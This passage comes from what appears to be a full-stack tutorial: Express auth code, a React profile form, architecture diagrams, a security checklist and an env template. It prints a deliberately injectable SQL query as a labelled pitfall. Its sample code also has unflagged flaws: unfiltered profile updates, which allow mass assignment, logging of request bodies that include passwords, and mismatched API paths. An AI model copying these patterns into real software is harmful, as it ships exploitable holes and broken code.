exports.register = async (req, res, next) => {
  try {
    const { token, user } = await userService.createUser(req.body);
    res.status(201).json({ token, user });
  } catch (err) {
    next(err);
  }
};

exports.login = async (req, res, next) => {
  try {
    const { token, user } = await userService.authenticate(req.body);
    res.json({ token, user });
  } catch (err) {
    next(err);
  }
};

exports.getProfile = async (req, res, next) => {
  try {
    const user = await userService.getUserById(req.user.userId);
    res.json(user);
  } catch (err) {
    next(err);
  }
};

exports.updateProfile = async (req, res, next) => {
  try {
    const user = await userService.updateUser(req.user.userId, req.body);
    res.json(user);
  } catch (err) {
    next(err);
  }
};
```

**src/services/users.service.js**
```javascript
const User = require('../models/User');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const emailApi = require('./external/emailApi');

exports.createUser = async (userData) => {
  // Hash password
  const passwordHash = await bcrypt.hash(userData.password, 10);
  
  // Create user in DB
  const user = await User.create({
    name: userData.name,
    email: userData.email,
    passwordHash
  });
  
  // Send welcome email (external API)
  await emailApi.sendWelcomeEmail(user.email, user.name);
  
  // Generate JWT
  const token = jwt.sign(
    { userId: user.id },
    process.env.JWT_SECRET,
    { expiresIn: '7d' }
  );
  
  return { token, user: { id: user.id, name: user.name, email: user.email } };
};

exports.authenticate = async ({ email, password }) => {
  const user = await User.findOne({ email });
  if (!user) throw new Error('Invalid credentials');
  
  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) throw new Error('Invalid credentials');
  
  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });
  return { token, user: { id: user.id, name: user.name, email: user.email } };
};

exports.getUserById = async (id) => {
  return User.findById(id).select('-passwordHash');
};

exports.updateUser = async (id, updates) => {
  return User.findByIdAndUpdate(id, updates, { new: true }).select('-passwordHash');
};
```

**src/services/external/emailApi.js**
```javascript
const axios = require('axios');

const emailClient = axios.create({
  baseURL: 'https://api.sendgrid.com/v3',
  headers: { Authorization: `Bearer ${process.env.SENDGRID_API_KEY}` }
});

exports.sendWelcomeEmail = async (to, name) => {
  await emailClient.post('/mail/send', {
    personalizations: [{ to: [{ email: to }] }],
    from: { email: 'noreply@myapp.com' },
    subject: 'Welcome!',
    content: [{ type: 'text/plain', value: `Hi ${name}, welcome to our app!` }]
  });
};
```

**src/middleware/auth.js**
```javascript
const jwt = require('jsonwebtoken');

module.exports = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch (err) {
    res.status(403).json({ error: 'Invalid token' });
  }
};
```

---

### Frontend Files

**src/api/client.js**
```javascript
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL + '/api'
});

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

export default api;
```

**src/components/UserProfile.jsx**
```javascript
import { useState, useEffect } from 'react';
import api from '../api/client';

function UserProfile() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.get('/api/v1/users/me')
      .then(res => setUser(res.data))
      .catch(err => console.error(err))
      .finally(() => setLoading(false));
  }, []);

  const handleUpdate = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    
    await api.patch('/api/v1/users/me', {
      name: formData.get('name'),
      email: formData.get('email')
    });
    
    alert('Profile updated!');
  };

  if (loading) return <div>Loading...</div>;

  return (
    <form onSubmit={handleUpdate}>
      <input name="name" defaultValue={user.name} />
      <input name="email" defaultValue={user.email} />
      <button type="submit">Update</button>
    </form>
  );
}

export default UserProfile;
```

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                          FRONTEND (React/Vue)                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │ User clicks  │  │ Axios/Fetch  │  │ localStorage │             │
│  │   button     │─▶│  sends HTTP  │─▶│  stores JWT  │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
└────────────────────────┬────────────────────────────────────────────┘
                         │ HTTP Request
                         │ POST /api/v1/orders
                         │ Authorization: Bearer <token>
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      BACKEND (Node.js/Express)                      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │   Routes     │─▶│ Auth Middle- │─▶│ Controllers  │             │
│  │   /api/v1/*  │  │   ware (JWT) │  │              │             │
│  └──────────────┘  └──────────────┘  └──────┬───────┘             │
│                                              │                      │
│                                              ▼                      │
│                                      ┌──────────────┐              │
│                                      │   Services   │              │
│                                      │ (Business    │              │
│                                      │   Logic)     │              │
│                                      └───┬──────┬───┘              │
│                                          │      │                  │
└──────────────────────────────────────────┼──────┼──────────────────┘
                                           │      │
                    ┌──────────────────────┘      └────────────────┐
                    ▼                                              ▼
        ┌─────────────────────────┐                  ┌──────────────────────┐
        │   DATABASE (PostgreSQL) │                  │  EXTERNAL PUBLIC APIs│
        │  ┌──────────────────┐   │                  │  ┌────────────────┐ │
        │  │  users table     │   │                  │  │ Stripe API     │ │
        │  │  orders table    │   │                  │  │ SendGrid API   │ │
        │  │  products table  │   │                  │  │ Weather API    │ │
        │  └──────────────────┘   │                  │  └────────────────┘ │
        └─────────────────────────┘                  └──────────────────────┘
               │ SQL Queries                                │ HTTP Requests
               │ SELECT * FROM users                        │ GET /weather?city=NY
               ▼                                            ▼
        Returns user data                           Returns weather data
```

**Flow:**
1. User interacts with UI → Frontend sends HTTP request
2. Backend routes → Auth middleware validates JWT
3. Controller receives request → Calls service layer
4. Service layer executes business logic:
   - Fetches from **database** (your app's data)
   - Calls **external APIs** (third-party services)
5. Response sent back to frontend
6. Frontend updates UI

---

## Request Flow Summary

```
┌──────────────┐                ┌──────────────┐                 ┌──────────────┐
│   Frontend   │                │   Backend    │                 │   Database   │
│  (React)     │                │  (Express)   │                 │ (PostgreSQL) │
└──────────────┘                └──────────────┘                 └──────────────┘
       │                                │                                │
       │  GET /api/v1/users/me          │                                │
       │  Authorization: Bearer token   │                                │
       ├───────────────────────────────>│                                │
       │                                │                                │
       │                                │ Verify JWT                     │
       │                                │ Extract userId                 │
       │                                │                                │
       │                                │  SELECT * FROM users           │
       │                                │  WHERE id = userId             │
       │                                ├───────────────────────────────>│
       │                                │                                │
       │                                │  User data                     │
       │                                │<───────────────────────────────┤
       │                                │                                │
       │                                │ Call external API              │
       │                                │ (send analytics event)         │
       │                                │                                │
       │  200 OK                        │                                │
       │  { id: 123, name: "John" }     │                                │
       │<───────────────────────────────┤                                │
       │                                │                                │
       │  Update UI                     │                                │
       │                                │                                │
```

---

## Security Checklist

### Critical Rules (Review [Security Principles](#-critical-security-principles))
- [ ] **Frontend .env variables are PUBLIC** - never store secrets, API keys, or DB credentials
- [ ] **Backend is secret keeper** - all sensitive credentials only in backend .env
- [ ] **Frontend → Backend only** - never direct DB or external API calls from frontend
- [ ] **JWT storage:** Use HttpOnly cookies for high-security apps (banking, healthcare)
- [ ] **CORS:** Never `origin: '*'` with `credentials: true` - browser will reject

### Implementation Checklist
- [ ] Use HTTPS in production (enforce with `secure: true` cookies)
- [ ] Validate all user input on backend (never trust frontend validation alone)
- [ ] Hash passwords with bcrypt (minimum 10 rounds, 12+ recommended)
- [ ] JWT_SECRET minimum 32 random characters (use crypto.randomBytes(64).toString('hex'))
- [ ] Set specific CORS origins from environment variables
- [ ] Implement rate limiting (express-rate-limit: 100 requests/15min per IP)
- [ ] Use parameterized SQL queries (never string concatenation)
- [ ] Never commit .env to Git (add to .gitignore immediately)
- [ ] Use helmet.js for security headers (XSS, clickjacking protection)
- [ ] Implement CSRF tokens if using cookies for auth
- [ ] Log security events (failed logins, unusual access patterns)
- [ ] Rotate secrets regularly (DB passwords, API keys every 90 days)
- [ ] Use prepared statements for database queries (ORM or parameterized)
- [ ] Sanitize user input before displaying (prevent XSS in stored data)
- [ ] Set cookie flags correctly: `httpOnly`, `secure`, `sameSite: 'strict'`

---

## Common Pitfalls

**❌ Storing passwords in plain text**
```javascript
// NEVER DO THIS
user.password = req.body.password;
```

**✅ Always hash**
```javascript
user.passwordHash = await bcrypt.hash(req.body.password, 10);
```

---

**❌ SQL injection**
```javascript
// DANGEROUS
db.query(`SELECT * FROM users WHERE email = '${email}'`);
```

**✅ Parameterized queries**
```javascript
db.query('SELECT * FROM users WHERE email = $1', [email]);
```

---

**❌ Exposing sensitive data**
```javascript
// Don't send password hash to frontend
res.json(user); // Includes passwordHash field
```

**✅ Exclude sensitive fields**
```javascript
const { passwordHash, ...safeUser } = user;
res.json(safeUser);
```

---

## Performance Tips

1. **Use connection pooling** (don't create new DB connection per request)
2. **Add database indexes** on frequently queried columns
3. **Cache frequent queries** (Redis)
4. **Paginate large datasets** (limit, offset)
5. **Compress responses** (gzip middleware)
6. **Use CDN** for static assets
7. **Implement rate limiting** to prevent abuse

---

## Debugging

**Backend:**
```javascript
// Log all requests
app.use((req, res, next) => {
  console.log(`${req.method} ${req.path}`, req.body);
  next();
});
```

**Frontend:**
```javascript
// Log API calls
api.interceptors.request.use((config) => {
  console.log('Request:', config.method, config.url);
  return config;
});
```

**Database:**
```javascript
// Log queries
db.query = new Proxy(originalQuery, {
  apply(target, thisArg, args) {
    console.log('Query:', args[0]);
    return target.apply(thisArg, args);
  }
});
```

---

## Testing

**Backend (Jest + Supertest):**
```javascript
const request = require('supertest');
const app = require('./app');

test('POST /api/v1/users/login returns token', async () => {
  const res = await request(app)
    .post('/api/v1/users/login')
    .send({ email: 'test@ex.com', password: 'pass123' });
  
  expect(res.status).toBe(200);
  expect(res.body).toHaveProperty('token');
});
```

**Frontend (React Testing Library):**
```javascript
test('UserProfile displays user name', async () => {
  render(<UserProfile />);
  await waitFor(() => {
    expect(screen.getByText('John Doe')).toBeInTheDocument();
  });
});
```

---

## Next Steps

1. **Learn TypeScript** for better type safety
2. **Add input validation** (Joi, Zod, express-validator)
3. **Implement logging** (Winston, Pino)
4. **Set up CI/CD** (GitHub Actions, Jenkins)
5. **Deploy** (Vercel for frontend, Railway/Render for backend)
6. **Monitor** (Sentry for errors, Datadog for metrics)
7. **Scale** (Load balancing, horizontal scaling)

---

## Quick Reference

### 🔐 Security Golden Rules
```
1. Frontend .env = PUBLIC (never secrets)
2. Backend .env = PRIVATE (all secrets here)
3. Frontend → Backend API ONLY (never direct DB/external APIs)
4. High-security apps → HttpOnly cookies (not localStorage)
5. CORS production → Specific origins (never '*' with credentials)
```

### HTTP Method Cheat Sheet
```
GET    /api/v1/users       → List all users
GET    /api/v1/users/123   → Get user 123
POST   /api/v1/users       → Create new user
PUT    /api/v1/users/123   → Replace user 123 (all fields required)
PATCH  /api/v1/users/123   → Update user 123 (partial fields)
DELETE /api/v1/users/123   → Delete user 123
```

### Status Code Quick Guide
```
200 OK              → Success (GET, PUT, PATCH)
201 Created         → Success (POST)
204 No Content      → Success (DELETE)
400 Bad Request     → Invalid data
401 Unauthorized    → No/invalid token
403 Forbidden       → Valid token, insufficient permissions
404 Not Found       → Resource doesn't exist
500 Internal Error  → Server crashed
```

### Auth Flow Comparison
```
SESSION-BASED:
Login → Server stores session ID in DB → Cookie sent to browser
Request → Cookie auto-sent → Server checks DB

JWT-BASED:
Login → Server creates signed token → Frontend stores token
Request → Frontend sends token in header → Server verifies signature (no DB)
```

### Environment Variables Template
```bash
# ============================================
# FRONTEND .env (Vite/React) - PUBLIC/EXPOSED
# ============================================
VITE_API_URL=http://localhost:3000
VITE_STRIPE_PUBLISHABLE_KEY=pk_test_xxx  # ✅ Client-side key only
VITE_GOOGLE_MAPS_API_KEY=AIza...         # ✅ Browser key (domain-restricted)

# ❌ NEVER IN FRONTEND:
# - Database credentials
# - Stripe secret keys (sk_*)
# - SendGrid API keys
# - JWT secrets
# - Any password or private key

# ============================================
# BACKEND .env (Node.js) - PRIVATE/SECRET
# ============================================
PORT=3000
NODE_ENV=development

# Database (PRIVATE)
DB_HOST=localhost
DB_NAME=myapp
DB_USER=postgres
DB_PASSWORD=secure_random_password

# Auth (PRIVATE)
JWT_SECRET=use-crypto-randomBytes-64-toString-hex

# External APIs (PRIVATE)
STRIPE_SECRET_KEY=sk_live_xxxxx
SENDGRID_API_KEY=SG.xxxxxxx
OPENAI_API_KEY=sk-xxxxxxx

# CORS (PRIVATE)
ALLOWED_ORIGINS=https://myapp.com,https://www.myapp.com
```

---

## Resources

- [MDN HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [REST API Best Practices](https://restfulapi.net/)
- [JWT.io](https://jwt.io/)
- [Express Documentation](https://expressjs.com/)
- [PostgreSQL Tutorial](https://www.postgresqltutorial.com/)
- [Axios Documentation](https://axios-http.com/)